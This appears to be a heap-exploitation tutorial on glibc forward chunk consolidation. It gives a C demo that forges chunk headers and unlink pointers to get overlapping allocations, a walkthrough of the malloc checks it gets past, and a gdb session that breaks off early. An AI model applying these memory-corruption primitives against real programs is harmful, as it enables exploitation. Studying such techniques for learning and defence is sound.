# fwd consolidation

So chunk consolidation refers to when we free a chunk, that is next to an adjacent freed chunk (not present in the tcache/fastbin), and malloc will merge the two adjacent freed smaller chunks into one larger chunk.

The purpose of this code is to show how we can consolidate a chunk we are currently freeing, into another allocated chunk. The benefit of this, is we can have two separate chunks allocated to the same space, and potentially leverage that to do something like a tcache linked list/dup attack.

We will accomplish this, via writing to a few different areas.

Here is the code for the program:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 0x420
#define CHUNK_SIZE_HEADER_VALUE 0x431
#define CONSOLIDATED_SIZE 0x471

#define FAKE_CHUNK_PREV_SIZE 0x470
#define FAKE_CHUNK_SIZE 0x21

#define CHECK_CHUNK_PREV_SIZE 0x20
#define CHECK_CHUNK_SIZE 0x30

#define CONSOLIDATED_CHUNK_ALLOCATION_SIZE 0x480

void main() {
    long *chunk0,
            *chunk1,
            *chunk2,
            *consolidated_chunk,
            *consolidated_chunk_end;

    printf("So right now, we are going to try and consolidate a chunk we are freeing into an allocated chunk.\n");
    printf("This way, we can allocate a new chunk with malloc, that will overlap partially with another allocated heap chunk.\n");
    printf("Chunk consolidation happens, when under the right conditions, a malloc chunk is freed, and adjacent to another freed chunk.\n");
    printf("Malloc will merge the two smaller freed chunks into a single larger freed heap chunk.\n");
    printf("By consolidating a chunk into an existing freed chunk, with the right subsequent heap allocations, we can allocate the same heap space multiple times.\n");
    printf("Which can be helpful with a lot of heap pwning attacks.\n");
    printf("Right now, we will try to do forward consolidation, which means we are consolidating a newly freed chunk, with the chunk right after it in memory.\n");
    printf("Starting off, we will allocate three separate chunks.\n\n");

    chunk0 = malloc(CHUNK_SIZE);
    chunk1 = malloc(CHUNK_SIZE);
    chunk2 = malloc(0x80);

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n\n", chunk2);

    printf("We will be trying to forward consolidate Chunk1 (%p) into chunk2 (%p).\n\n", chunk1, chunk2);

    printf("So in order to do this, we will need to create several fake heap chunk headers.\n");
    printf("We will have to do more work than in previous libc versions, because of additional checks.\n\n");
    
    printf("First off, we will need to overwrite the size of Chunk1, so that it extends into Chunk2.\n");
    printf("I want the new consolidated chunk to extend 0x60 bytes into chunk2 (from 0x430 to 0x490).\n");
    printf("The first 0x40 bytes will come from expanding the chunk size of chunk1.\n");
    printf("The remaining 0x20 bytes will come from the fake chunk header we are consolidating into.\n");
    printf("So I will increase its size from 0x%x to 0x%x (prev_inuse flag set).\n\n", CHUNK_SIZE_HEADER_VALUE, CONSOLIDATED_SIZE);


    printf("Chunk1 old size:\t0x%lx\n", chunk1[-1]);
    chunk1[-1] = CONSOLIDATED_SIZE;
    printf("Chunk1 new size:\t0x%lx\n\n", chunk1[-1]);

    printf("Now after that, we will have to prepare the fake heap chunk header, for the fake heap chunk we will try to consolidate into.\n");
    printf("For this, there are 4 separate values we will need to set.\n");
    printf("The first two are the prev_size / chunk header size for the fake chunk.\n\n");
    
    printf("The prev_size will need to match the expanded size for chunk1, so it will be:\t0x%x\n", FAKE_CHUNK_PREV_SIZE);
    printf("The chunk header size will be 0x20, so we will expand the remaining 0x20 bytes.\n\n");

    chunk2[6] = FAKE_CHUNK_PREV_SIZE;
    chunk2[7] = FAKE_CHUNK_SIZE;

    printf("The remaining two values, will be the fwd/next ptrs for a libc main arena bin.\n");
    printf("As part of consolidation, it will expect the chunk we are consolidating into to be in a main arena bin.\n");
    printf("As such it will attempt to unlink the chunk from the bin, so we need to prepare for this.\n");
    printf("We will create a fake chunk in chunk0 (%p) with fwd/bk ptrs to our fake chunk (%p).\n", chunk0, &chunk2[6]);
    printf("And set our fwd/bk ptrs for our fake chunk to chunk0 (%p)\n\n", chunk0);

    chunk2[8] = ((long)chunk0);
    chunk2[9] = ((long)chunk0);

    printf("Now, we will create the fake libc main arena bin head chunk in chunk0.\n");
    printf("We will set the fwd/next ptrs to our fake chunk.\n\n");

    chunk0[2] = (long)&chunk2[6];
    chunk0[3] = (long)&chunk2[6];

    printf("There is one last fake header chunk we will need to create.\n");
    printf("We will need to create a fake chunk header, after the chunk we are consolidating into.\n");
    printf("This is for several reasons.\n");
    printf("First off, as part of forward consolidation, it will check (and update) the prev_size of the chunk after the chunk we are consolidating into.\n");
    printf("Secondly, as part of the malloc call where we will get the newly consolidated chunk, it will check the chunk size of the chunk after the consolidated fake chunk.\n");
    printf("So, we will need to set a prev_size, and chunk_size, that makes sense with the fake chunk that we created to consolidate into.\n");
    printf("For the prev_size, I choose 0x%x, to match the size of our fake chunk to consolidate into.\n", CHECK_CHUNK_PREV_SIZE);
    printf("For the chunk size, I choose 0x%x, to line up with the top chunk. While we don't strictly need to do this here, we can still fail certain checks if this chunk doesn't line up with another chunk.\n\n", CHECK_CHUNK_SIZE);

    chunk2[10] = CHECK_CHUNK_PREV_SIZE;
    chunk2[11] = CHECK_CHUNK_SIZE;

    printf("Now we will go ahead, and free chunk1, to cause fwd consolidation.\n\n");

    free(chunk1);

    printf("And now, we will reallocate chunk1, with a size of 0x%x.\n", CONSOLIDATED_CHUNK_ALLOCATION_SIZE);

    consolidated_chunk = malloc(CONSOLIDATED_CHUNK_ALLOCATION_SIZE);
    consolidated_chunk_end = consolidated_chunk + CONSOLIDATED_CHUNK_ALLOCATION_SIZE + 0x10;

    printf("Consolidated Chunk:\t%p\n", consolidated_chunk);
    printf("Consolidated Chunk End:\t%p\n", consolidated_chunk_end);
    printf("Chunk2 (still allocated):\t%p\n", chunk2);
    printf("Consolidate Chunk encompasses part of Chunk2:\t%s\n\n", ((consolidated_chunk < chunk2) && (chunk2 < consolidated_chunk_end)) ? "True" : "False");

    printf("Just like that, we were able to get malloc to allocate overlapping chunks via fwd consolidation!\n");
}
```

## Walkthrough

So in more recent versions of libc, additional checks have been introduced. If you are coming from an older libc version, you will see it now requires a few extra steps.

Also one thing to note here, we are effectively going to be creating new chunks simply by either changing values in existing chunk headers, or all together just writing false chunk headers to places to create new fake chunks.

Also for context, consolidation can occur either forwards (we are consolidating with an adjacent chunk past the chunk being freed) and backwards (we are consolidating with an adjacent chunk behind the current chunk being freed). This writeup will focus on forward consolidation.

So first off, let's highlight what we need to actually do forward consolidation. First it will look at the header of the next adjacent chunk, using the size value of the chunk being freed. For the next chunk, it's prev_inuse flag bit of it's size in the chunk header must not be set (to signify that the previous chunk has been freed, and not in the tcache / fastbin). After that, the `prev_size` value must actually be set to the size listed in the chunk header of the chunk we are freeing (there is a check for this). After those two conditions happen, there is one last thing it will do prior to consolidating the chunks.

The chunk we are consolidating into, it expects it to be present in something like the unsorted bin. As such, since we're merging it into another chunk, we will need to unlink it, prior to merging, which is done with the `unlink_chunk` function. This will perform some checks on the new chunk, which we are "consolidating into".

For this chunk we are consolidating into, the prev_size of the next adjacent chunk to the chunk we are consolidating into (according to the size of the chunk we are consolidating into), must match the size of the chunk we are consolidating into `if (chunksize (p) != prev_size (next_chunk (p)))`, and it would help for the next adjacent chunk to also have a heap chunk header size that makes sense.

After this, it will look at the doubly linked list pointers present within the chunk (remember the unsorted bin doubly linked list?). First, it will check if the bk of the fwd chunk, and the fwd of the bk chunk, are both to the current chunk. If they aren't it will fail a check and malloc will die. After that, it will simply remove the chunk from the linked list with a `fd->bk = bk` and `bk->fd = fd`.

There is some additional functionality and checks here for large bin chunks, since they have the skiplist they also have to worry about. I'm only dealing with smallbin sized chunks here, so I'm not going into that right now.

But ya, we will need to have this chunk have valid ptrs for the doubly linked list removal. If we have an ASLR heap leak and know the memory layout of the heap, and we have another heap chunk somewhere we can store `0x10` bytes of data, we can effectively forge fake `fwd/bk` chunks, which will allow the unlinking process to occur without a scratch.

So now let's look at the code. Our goal here, will be to free `chunk1`, and cause it to consolidate into `chunk2`. Then, we will be able to reallocate `chunk1`, and see that part of `chunk1` overlaps partly with `chunk2`. This will not be a pure overlapping chunk, but we will have the same area of memory mapped to two separate heap chunks, both allocated with `malloc`.

So, the first thing that we will need to do is expand the size of `chunk1` (overwrite the size value in the chunk header with a larger value). I want the consolidated `chunk1` to encompass the first `0x60` bytes of `chunk2` (including the heap chunk header). The proper size value of `chunk1` is `0x430`, so we will need to add `0x60` bytes to it, to get `0x490`. The first `0x40` bytes will come from expanding the size of `chunk1` to `0x471`, and the remaining `0x20` bytes will come from creating a fake chunk within `chunk2` that we consolidate into, of size `0x20`.

Next up, I need to prepare the fake heap chunk header, for the fake chunk we are consolidating into. For this I will need a `prev_size`, and a chunk header size. The `prev_size` will have to be equal to the previous chunk's size because of the check, so it will be `0x470`. For the size of the chunk, I am going to put `0x21` (`prev_inuse` flag set). I do not want to extend the chunk all the way to the heap top chunk (I forget if it will, but we might encounter some top chunk consolidation, which I want to save to later, and other potential problems especially if it extends past the top). Also if we wanted the consolidated forward chunk to encompass more data, we could expand the size of the fake chunk we are making. Also we will need to have the `prev_inuse` bit set, since free is freeing that chunk, it would expect it to be allocated (it is the one that frees it after all).

After that, the last thing we will need to have set up are the `fwd/bk` pointers for the bin chunk unlinking. For this, I tried to imitate what a normal main arena bin looks like with only one chunk in it.

As a reminder, for a doubly linked list main arena bin, the head chunk is what's stored in the array. The head chunk doesn't actually model a real chunk. If there is only one chunk in there, its bk/fwd pointers will both point to the single chunk in the list, and the single chunk in the list will have a bk/fwd pointer that points to the head. For this, we will make a "fake head chunk" which will be stored in another heap chunk. In a practical setting, we would need to know what address we are storing the fake chunk at (since we need ptrs to it). Also keep in mind, because of how the struct for these chunks works, the ptrs to the "bin head chunk" will be to 0x10 bytes before the fwd/bk pointers of that chunk. The fwd/bk pointers of the "bin head chunk" will point to the start of the chunk header of our fake chunk we are consolidating into.

Now let's see the code in action! First off, let's see the three chunks right after they've been allocated:

```
$   gdb ./fwd_consolidation
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./fwd_consolidation...
(No debugging symbols found in ./fwd_consolidation)
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011a9 <+0>: endbr64
   0x00000000000011ad <+4>: push   rbp
   0x00000000000011ae <+5>: mov rbp,rsp
   0x00000000000011b1 <+8>: sub rsp,0x30
   0x00000000000011b5 <+12>:    lea rax,[rip+0xe4c]     # 0x2008
   0x00000000000011bc <+19>:    mov rdi,rax
   0x00000000000011bf <+22>:    call   0x1090 <puts@plt>
   0x00000000000011c4 <+27>:    lea rax,[rip+0xea5]     # 0x2070
   0x00000000000011cb <+34>:    mov rdi,rax
   0x00000000000011ce <+37>:    call   0x1090 <puts@plt>
   0x00000000000011d3 <+42>:    lea rax,[rip+0xf0e]     # 0x20e8
   0x00000000000011da <+49>:    mov rdi,rax
   0x00000000000011dd <+52>:    call   0x1090 <puts@plt>
   0x00000000000011e2 <+57>:    lea rax,[rip+0xf7f]     # 0x2168
   0x00000000000011e9 <+64>:    mov rdi,rax
   0x00000000000011ec <+67>:    call   0x1090 <puts@plt>
   0x00000000000011f1 <+72>:    lea rax,[rip+0xfc8]     # 0x21c0
   0x00000000000011f8 <+79>:    mov rdi,rax
   0x00000000000011fb <+82>:    call   0x1090 <puts@plt>
   0x0000000000001200 <+87>:    lea rax,[rip+0x1051]        # 0x2258
   0x0000000000001207 <+94>:    mov rdi,rax
   0x000000000000120a <+97>:    call   0x1090 <puts@plt>
   0x000000000000120f <+102>:   lea rax,[rip+0x107a]        # 0x2290
   0x0000000000001216 <+109>:   mov rdi,rax
   0x0000000000001219 <+112>:   call   0x1090 <puts@plt>
   0x000000000000121e <+117>:   lea rax,[rip+0x1103]        # 0x2328
   0x0000000000001225 <+124>:   mov rdi,rax
   0x0000000000001228 <+127>:   call   0x1090 <puts@plt>
   0x000000000000122d <+132>:   mov edi,0x420
   0x0000000000001232 <+137>:   call   0x10b0 <malloc@plt>
   0x0000000000001237 <+142>:   mov QWORD PTR [rbp-0x28],rax
   0x000000000000123b <+146>:   mov edi,0x420
   0x0000000000001240 <+151>:   call   0x10b0 <malloc@plt>
   0x0000000000001245 <+156>:   mov QWORD PTR [rbp-0x20],rax
   0x0000000000001249 <+160>:   mov edi,0x80
   0x000000000000124e <+165>:   call   0x10b0 <malloc@plt>
   0x0000000000001253 <+170>:   mov QWORD PTR [rbp-0x18],rax
   0x0000000000001257 <+174>:   mov rax,QWORD PTR [rbp-0x28]
   0x000000000000125b <+178>:   mov rsi,rax
   0x000000000000125e <+181>:   lea rax,[rip+0x10fa]        # 0x235f
   0x0000000000001265 <+188>:   mov rdi,rax
   0x0000000000001268 <+191>:   mov eax,0x0
   0x000000000000126d <+196>:   call   0x10a0 <printf@plt>
   0x0000000000001272 <+201>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001276 <+205>:   mov rsi,rax
   0x0000000000001279 <+208>:   lea rax,[rip+0x10eb]        # 0x236b
   0x0000000000001280 <+215>:   mov rdi,rax
   0x0000000000001283 <+218>:   mov eax,0x0
   0x0000000000001288 <+223>:   call   0x10a0 <printf@plt>
   0x000000000000128d <+228>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001291 <+232>:   mov rsi,rax
   0x0000000000001294 <+235>:   lea rax,[rip+0x10dc]        # 0x2377
   0x000000000000129b <+242>:   mov rdi,rax
   0x000000000000129e <+245>:   mov eax,0x0
   0x00000000000012a3 <+250>:   call   0x10a0 <printf@plt>
   0x00000000000012a8 <+255>:   mov rdx,QWORD PTR [rbp-0x18]
   0x00000000000012ac <+259>:   mov rax,QWORD PTR [rbp-0x20]
   0x00000000000012b0 <+263>:   mov rsi,rax
   0x00000000000012b3 <+266>:   lea rax,[rip+0x10ce]        # 0x2388
   0x00000000000012ba <+273>:   mov rdi,rax
   0x00000000000012bd <+276>:   mov eax,0x0
   0x00000000000012c2 <+281>:   call   0x10a0 <printf@plt>
   0x00000000000012c7 <+286>:   lea rax,[rip+0x110a]        # 0x23d8
   0x00000000000012ce <+293>:   mov rdi,rax
   0x00000000000012d1 <+296>:   call   0x1090 <puts@plt>
   0x00000000000012d6 <+301>:   lea rax,[rip+0x114b]        # 0x2428
   0x00000000000012dd <+308>:   mov rdi,rax
   0x00000000000012e0 <+311>:   call   0x1090 <puts@plt>
   0x00000000000012e5 <+316>:   lea rax,[rip+0x119c]        # 0x2488
   0x00000000000012ec <+323>:   mov rdi,rax
   0x00000000000012ef <+326>:   call   0x1090 <puts@plt>
   0x00000000000012f4 <+331>:   lea rax,[rip+0x11ed]        # 0x24e8
   0x00000000000012fb <+338>:   mov rdi,rax
   0x00000000000012fe <+341>:   call   0x1090 <puts@plt>
   0x0000000000001303 <+346>:   lea rax,[rip+0x123e]        # 0x2548
   0x000000000000130a <+353>:   mov rdi,rax
   0x000000000000130d <+356>:   call   0x1090 <puts@plt>
   0x0000000000001312 <+361>:   lea rax,[rip+0x1277]        # 0x2590
   0x0000000000001319 <+368>:   mov rdi,rax
   0x000000000000131c <+371>:   call   0x1090 <puts@plt>
   0x0000000000001321 <+376>:   mov edx,0x471
   0x0000000000001326 <+381>:   mov esi,0x431
   0x000000000000132b <+386>:   lea rax,[rip+0x12be]        # 0x25f0
   0x0000000000001332 <+393>:   mov rdi,rax
   0x0000000000001335 <+396>:   mov eax,0x0
   0x000000000000133a <+401>:   call   0x10a0 <printf@plt>
   0x000000000000133f <+406>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001343 <+410>:   sub rax,0x8
   0x0000000000001347 <+414>:   mov rax,QWORD PTR [rax]
   0x000000000000134a <+417>:   mov rsi,rax
   0x000000000000134d <+420>:   lea rax,[rip+0x12e3]        # 0x2637
   0x0000000000001354 <+427>:   mov rdi,rax
   0x0000000000001357 <+430>:   mov eax,0x0
   0x000000000000135c <+435>:   call   0x10a0 <printf@plt>
   0x0000000000001361 <+440>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001365 <+444>:   sub rax,0x8
   0x0000000000001369 <+448>:   mov QWORD PTR [rax],0x471
   0x0000000000001370 <+455>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001374 <+459>:   sub rax,0x8
   0x0000000000001378 <+463>:   mov rax,QWORD PTR [rax]
   0x000000000000137b <+466>:   mov rsi,rax
   0x000000000000137e <+469>:   lea rax,[rip+0x12ca]        # 0x264f
   0x0000000000001385 <+476>:   mov rdi,rax
   0x0000000000001388 <+479>:   mov eax,0x0
   0x000000000000138d <+484>:   call   0x10a0 <printf@plt>
   0x0000000000001392 <+489>:   lea rax,[rip+0x12cf]        # 0x2668
   0x0000000000001399 <+496>:   mov rdi,rax
   0x000000000000139c <+499>:   call   0x1090 <puts@plt>
   0x00000000000013a1 <+504>:   lea rax,[rip+0x1340]        # 0x26e8
   0x00000000000013a8 <+511>:   mov rdi,rax
   0x00000000000013ab <+514>:   call   0x1090 <puts@plt>
   0x00000000000013b0 <+519>:   lea rax,[rip+0x1371]        # 0x2728
   0x00000000000013b7 <+526>:   mov rdi,rax
   0x00000000000013ba <+529>:   call   0x1090 <puts@plt>
   0x00000000000013bf <+534>:   mov esi,0x470
   0x00000000000013c4 <+539>:   lea rax,[rip+0x13ad]        # 0x2778
   0x00000000000013cb <+546>:   mov rdi,rax
   0x00000000000013ce <+549>:   mov eax,0x0
   0x00000000000013d3 <+554>:   call   0x10a0 <printf@plt>
   0x00000000000013d8 <+559>:   lea rax,[rip+0x13f1]        # 0x27d0
   0x00000000000013df <+566>:   mov rdi,rax
   0x00000000000013e2 <+569>:   call   0x1090 <puts@plt>
   0x00000000000013e7 <+574>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000013eb <+578>:   add rax,0x30
   0x00000000000013ef <+582>:   mov QWORD PTR [rax],0x470
   0x00000000000013f6 <+589>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000013fa <+593>:   add rax,0x38
   0x00000000000013fe <+597>:   mov QWORD PTR [rax],0x21
   0x0000000000001405 <+604>:   lea rax,[rip+0x141c]        # 0x2828
   0x000000000000140c <+611>:   mov rdi,rax
   0x000000000000140f <+614>:   call   0x1090 <puts@plt>
   0x0000000000001414 <+619>:   lea rax,[rip+0x145d]        # 0x2878
   0x000000000000141b <+626>:   mov rdi,rax
   0x000000000000141e <+629>:   call   0x1090 <puts@plt>
   0x0000000000001423 <+634>:   lea rax,[rip+0x14b6]        # 0x28e0
   0x000000000000142a <+641>:   mov rdi,rax
   0x000000000000142d <+644>:   call   0x1090 <puts@plt>
   0x0000000000001432 <+649>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001436 <+653>:   lea rdx,[rax+0x30]
   0x000000000000143a <+657>:   mov rax,QWORD PTR [rbp-0x28]
   0x000000000000143e <+661>:   mov rsi,rax
   0x0000000000001441 <+664>:   lea rax,[rip+0x14f8]        # 0x2940
   0x0000000000001448 <+671>:   mov rdi,rax
   0x000000000000144b <+674>:   mov eax,0x0
   0x0000000000001450 <+679>:   call   0x10a0 <printf@plt>
   0x0000000000001455 <+684>:   mov rax,QWORD PTR [rbp-0x28]
   0x0000000000001459 <+688>:   mov rsi,rax
   0x000000000000145c <+691>:   lea rax,[rip+0x1535]        # 0x2998
   0x0000000000001463 <+698>:   mov rdi,rax
   0x0000000000001466 <+701>:   mov eax,0x0
   0x000000000000146b <+706>:   call   0x10a0 <printf@plt>
   0x0000000000001470 <+711>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001474 <+715>:   lea rdx,[rax+0x40]
   0x0000000000001478 <+719>:   mov rax,QWORD PTR [rbp-0x28]
   0x000000000000147c <+723>:   mov QWORD PTR [rdx],rax
   0x000000000000147f <+726>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001483 <+730>:   lea rdx,[rax+0x48]
   0x0000000000001487 <+734>:   mov rax,QWORD PTR [rbp-0x28]
   0x000000000000148b <+738>:   mov QWORD PTR [rdx],rax
   0x000000000000148e <+741>:   lea rax,[rip+0x1543]        # 0x29d8
   0x0000000000001495 <+748>:   mov rdi,rax
   0x0000000000001498 <+751>:   call   0x1090 <puts@plt>
   0x000000000000149d <+756>:   lea rax,[rip+0x157c]        # 0x2a20
   0x00000000000014a4 <+763>:   mov rdi,rax
   0x00000000000014a7 <+766>:   call   0x1090 <puts@plt>
   0x00000000000014ac <+771>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000014b0 <+775>:   lea rdx,[rax+0x30]
   0x00000000000014b4 <+779>:   mov rax,QWORD PTR [rbp-0x28]
   0x00000000000014b8 <+783>:   add rax,0x10
   0x00000000000014bc <+787>:   mov QWORD PTR [rax],rdx
   0x00000000000014bf <+790>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000014c3 <+794>:   lea rdx,[rax+0x30]
   0x00000000000014c7 <+798>:   mov rax,QWORD PTR [rbp-0x28]
   0x00000000000014cb <+802>:   add rax,0x18
   0x00000000000014cf <+806>:   mov QWORD PTR [rax],rdx
   0x00000000000014d2 <+809>:   lea rax,[rip+0x157f]        # 0x2a58
   0x00000000000014d9 <+816>:   mov rdi,rax
   0x00000000000014dc <+819>:   call   0x1090 <puts@plt>
   0x00000000000014e1 <+824>:   lea rax,[rip+0x15b0]        # 0x2a98
   0x00000000000014e8 <+831>:   mov rdi,rax
   0x00000000000014eb <+834>:   call   0x1090 <puts@plt>
   0x00000000000014f0 <+839>:   lea rax,[rip+0x15f8]        # 0x2aef
   0x00000000000014f7 <+846>:   mov rdi,rax
   0x00000000000014fa <+849>:   call   0x1090 <puts@plt>
   0x00000000000014ff <+854>:   lea rax,[rip+0x160a]        # 0x2b10
   0x0000000000001506 <+861>:   mov rdi,rax
   0x0000000000001509 <+864>:   call   0x1090 <puts@plt>
   0x000000000000150e <+869>:   lea rax,[rip+0x168b]        # 0x2ba0
   0x0000000000001515 <+876>:   mov rdi,rax
   0x0000000000001518 <+879>:   call   0x1090 <puts@plt>
   0x000000000000151d <+884>:   lea rax,[rip+0x1724]        # 0x2c48
   0x0000000000001524 <+891>:   mov rdi,rax
   0x0000000000001527 <+894>:   call   0x1090 <puts@plt>
   0x000000000000152c <+899>:   mov esi,0x20
   0x0000000000001531 <+904>:   lea rax,[rip+0x1790]        # 0x2cc8
   0x0000000000001538 <+911>:   mov rdi,rax
   0x000000000000153b <+914>:   mov eax,0x0
   0x0000000000001540 <+919>:   call   0x10a0 <printf@plt>
   0x0000000000001545 <+924>:   mov esi,0x30
   0x000000000000154a <+929>:   lea rax,[rip+0x17d7]        # 0x2d28
   0x0000000000001551 <+936>:   mov rdi,rax
   0x0000000000001554 <+939>:   mov eax,0x0
   0x0000000000001559 <+944>:   call   0x10a0 <printf@plt>
   0x000000000000155e <+949>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001562 <+953>:   add rax,0x50
   0x0000000000001566 <+957>:   mov QWORD PTR [rax],0x20
   0x000000000000156d <+964>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001571 <+968>:   add rax,0x58
   0x0000000000001575 <+972>:   mov QWORD PTR [rax],0x30
   0x000000000000157c <+979>:   lea rax,[rip+0x186d]        # 0x2df0
   0x0000000000001583 <+986>:   mov rdi,rax
   0x0000000000001586 <+989>:   call   0x1090 <puts@plt>
   0x000000000000158b <+994>:   mov rax,QWORD PTR [rbp-0x20]
   0x000000000000158f <+998>:   mov rdi,rax
   0x0000000000001592 <+1001>:  call   0x1080 <free@plt>
   0x0000000000001597 <+1006>:  mov esi,0x480
   0x000000000000159c <+1011>:  lea rax,[rip+0x1895]        # 0x2e38
   0x00000000000015a3 <+1018>:  mov rdi,rax
   0x00000000000015a6 <+1021>:  mov eax,0x0
   0x00000000000015ab <+1026>:  call   0x10a0 <printf@plt>
   0x00000000000015b0 <+1031>:  mov edi,0x480
   0x00000000000015b5 <+1036>:  call   0x10b0 <malloc@plt>
   0x00000000000015ba <+1041>:  mov QWORD PTR [rbp-0x10],rax
   0x00000000000015be <+1045>:  mov rax,QWORD PTR [rbp-0x10]
   0x00000000000015c2 <+1049>:  add rax,0x2480
   0x00000000000015c8 <+1055>:  mov QWORD PTR [rbp-0x8],rax
   0x00000000000015cc <+1059>:  mov rax,QWORD PTR [rbp-0x10]
   0x00000000000015d0 <+1063>:  mov rsi,rax
   0x00000000000015d3 <+1066>:  lea rax,[rip+0x1898]        # 0x2e72
   0x00000000000015da <+1073>:  mov rdi,rax
   0x00000000000015dd <+1076>:  mov eax,0x0
   0x00000000000015e2 <+1081>:  call   0x10a0 <printf@plt>
   0x00000000000015e7 <+1086>:  mov rax,QWORD PTR [rbp-0x8]
   0x00000000000015eb <+1090>:  mov rsi,rax
   0x00000000000015ee <+1093>:  lea rax,[rip+0x1895]        # 0x2e8a
   0x00000000000015f5 <+1100>:  mov rdi,rax
   0x00000000000015f8 <+1103>:  mov eax,0x0
   0x00000000000015fd <+1108>:  call   0x10a0 <printf@plt>
   0x0000000000001602 <+1113>:  mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001606 <+1117>:  mov rsi,rax
   0x0000000000001609 <+1120>:  lea rax,[rip+0x1896]        # 0x2ea6
   0x0000000000001610 <+1127>:  mov rdi,rax
   0x0000000000001613 <+1130>:  mov eax,0x0
   0x0000000000001618 <+1135>:  call   0x10a0 <printf@plt>
   0x000000000000161d <+1140>:  mov rax,QWORD PTR [rbp-0x10]
   0x0000000000001621 <+1144>:  cmp rax,QWORD PTR [rbp-0x18]
   0x0000000000001625 <+1148>:  jae 0x163a <main+1169>
   0x0000000000001627 <+1150>:  mov rax,QWORD PTR [rbp-0x18]
   0x000000000000162b <+1154>:  cmp rax,QWORD PTR [rbp-0x8]
   0x000000000000162f <+1158>:  jae 0x163a <main+1169>
   0x0000000000001631 <+1160>:  lea rax,[rip+0x188c]        # 0x2ec4
   0x0000000000001638 <+1167>:  jmp 0x1641 <main+1176>
   0x000000000000163a <+1169>:  lea rax,[rip+0x1888]        # 0x2ec9
   0x0000000000001641 <+1176>:  mov rsi,rax
   0x0000000000001644 <+1179>:  lea rax,[rip+0x1885]        # 0x2ed0
   0x000000000000164b <+1186>:  mov rdi,rax
   0x000000000000164e <+1189>:  mov eax,0x0
   0x0000000000001653 <+1194>:  call   0x10a0 <printf@plt>
   0x0000000000001658 <+1199>:  lea rax,[rip+0x18a9]        # 0x2f08
   0x000000000000165f <+1206>:  mov rdi,rax
   0x0000000000001662 <+1209>:  call   0x1090 <puts@plt>
   0x0000000000001667 <+1214>:  nop
   0x0000000000001668 <+1215>:  leave  
   0x0000000000001669 <+1216>:  ret    
End of assembler dump.
gef➤  b *main+1041
Breakpoint 1 at 0x15ba
gef➤  b *main+1001
Breakpoint 2 at 0x1592
gef➤  b *main+1006
Breakpoint 3 at 0x1597
gef➤  b *main+142
Breakpoint 4 at 0x1237
gef➤  b *main+170
Breakpoint 5 at 0x1253
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/malloc/fwd_consolidation/fwd_consolidation
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
So right now, we are going to try and consolidate a chunk we are freeing into an allocated chunk.
This way, we can allocate a new chunk with malloc, that will overlap partially with another allocated heap chunk.
Chunk consolidation happens, when under the right conditions, a malloc chunk is freed, and adjacent to another freed chunk.
Malloc will merge the two smaller freed chunks into a single larger freed heap chunk.
By consolidating a chunk into an existing freed chunk, with the right subsequent heap allocations, we can allocate the same heap space multiple times.
Which can be helpful with a lot of heap pwning attacks.
Right now, we will try to do forward consolidation, which means we are consolidating a newly freed chunk, with the chunk right after it in memory.
Starting off, we will allocate three separate chunks.


Breakpoint 4, 0x0000555555555237 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555a6b0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x431           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf80  →  0x0000000000000002
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x000055555555aad0  →  0x0000000000000000
$rdi   : 0x2             
$rip   : 0x0000555555555237  →  <main+142> mov QWORD PTR [rbp-0x28], rax
$r8 : 0x0            
$r9 : 0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x77            
$r11   : 0x00007ffff7e19ce0  →  0x000055555555aad0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3cb  →  "/Hackery/shogun/pwn_demos/malloc/fwd_cons[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555558da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdf88│+0x0008: 0x00000000078bfbff
0x00007fffffffdf90│+0x0010: 0x00007fffffffe3b9  →  0x000034365f363878 ("x86_64"?)
